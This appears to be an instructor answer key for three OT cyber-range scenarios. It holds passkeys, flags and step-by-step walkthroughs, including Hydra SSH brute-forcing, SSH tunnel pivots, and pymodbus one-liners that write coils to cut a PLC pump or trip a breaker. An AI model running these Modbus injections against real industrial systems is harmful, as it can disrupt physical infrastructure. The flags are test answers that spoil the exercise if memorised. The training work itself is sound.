# CyberRangeCZ OT Training Scenarios — Master Instructor Solution Manual

This document provides reference solutions, flags, and attack walkthroughs for all three Operational Technology (OT) training scenarios.

---

## 1. Simple OT Sandbox (`simple-ot-sandbox`)

### Overview:
A 3-host OT topology featuring Kali Linux (`attacker-host`), Node-RED HMI (`scada-hmi`), and OpenPLC (`openplc-node`) separated by an `ot-router`.

### Flags & Level Solutions:
1. **Level 1 (Access)**: Passkey `start_exercise`
2. **Level 2 (SCADA Infiltration)**:
   * Scan `10.10.10.0/24` to discover Node-RED on `10.10.10.10:1880`.
   * Access `http://10.10.10.10:1880`.
   * **Flag**: `FLAG{SCADA_HMI_COMPROMISED}`
3. **Level 3 (Substation Sabotage)**:
   * Perform Modbus TCP command injection targeting `192.168.99.10:502`:
     ```bash
     python3 -c "from pymodbus.client import ModbusTcpClient; c = ModbusTcpClient('192.168.99.10', port=502); c.connect(); c.write_coil(0, False); c.close()"
     ```
   * **Flag**: `FLAG{PLC_PUMP_DISRUPTED}`

---

## 2. Complex OT Sandbox (`complex-ot-sandbox`)

### Overview:
A 4-tier Purdue Model OT environment with an Industrial DMZ (`idmz-jump`), SCADA Control Room (`scada-hmi`), Engineering Workstation (`engineering-station`), and OpenPLC (`substation-plc`).

### Flags & Level Solutions:
1. **Level 1 (IDMZ Infiltration)**:
   * Hydra SSH password brute-force against `10.0.50.50` (`operator` / `operator123`).
   * **Flag**: `FLAG{IDMZ_JUMP_PIVOT_ESTABLISHED}`
2. **Level 2 (SCADA HMI Reconnaissance)**:
   * Tunnel SSH port 1880: `ssh -L 1880:10.0.2.10:1880 operator@10.0.50.50`.
   * View flow description at `http://localhost:1880`.
   * **Flag**: `FLAG{SCADA_HMI_COMPROMISED}`
3. **Level 3 (Engineering Workstation Privilege Escalation)**:
   * Retrieve leaked credentials from `/home/debian/ews_credentials.txt` on `scada-hmi`.
   * SSH to EWS (`10.0.2.20`).
   * **Flag**: `FLAG{EWS_ENGINEERING_COMPROMISED}`
4. **Level 4 (Substation PLC Modbus Injection)**:
   * Inject Modbus payload from EWS to `10.0.3.10:502`:
     ```bash
     python3 -c "from pymodbus.client import ModbusTcpClient; c = ModbusTcpClient('10.0.3.10', port=502); c.connect(); c.write_coil(0, False); c.close()"
     ```
   * **Flag**: `FLAG{SUBSTATION_GRID_OFFLINE}`

---

## 3. Operation Blackout Zero — Smart Grid Co-Simulation (`smartgrid-ot-sandbox`)

### Overview:
A 100% software-emulated Smart Grid Co-Simulation coupling GridLAB-D IEEE 13-node physics with OpenPLC V3, Node-RED, InfluxDB, and Grafana.

### Flags & Level Solutions:
1. **Level 1 (Orientation)**: Passkey `gridlock_start`
2. **Level 2 (IDMZ Infiltration)**:
   * Brute-force `operator@10.0.50.50` via Hydra (`operator123`).
   * **Flag**: `FLAG{IDMZ_JUMP_PIVOT_ESTABLISHED}`
3. **Level 3 (SCADA HMI Discovery)**:
   * SSH Tunnel: `ssh -L 1880:10.0.2.10:1880 -L 3000:10.0.2.10:3000 operator@10.0.50.50`.
   * Open `http://localhost:1880` (Node-RED) or `http://localhost:3000` (Grafana).
   * **Flag**: `FLAG{SCADA_HMI_MONITORING_COMPROMISED}`
4. **Level 4 (Substation Modbus Injection & Physics Collapse)**:
   * SSH Tunnel: `ssh -L 5020:10.0.3.10:502 operator@10.0.50.50`.
   * Run attack script: `python3 /home/kali/modbus_attack.py --target 127.0.0.1 --port 5020 --action trip_breaker`.
   * Verify grid collapse: `python3 /home/kali/modbus_attack.py --target 127.0.0.1 --port 5020 --action read`.
   * **Flag**: `FLAG{GRID_PHYSICAL_COLLAPSE_SUCCESSFUL}`
5. **Level 5 (Knowledge Assessment)**: MCQ test.
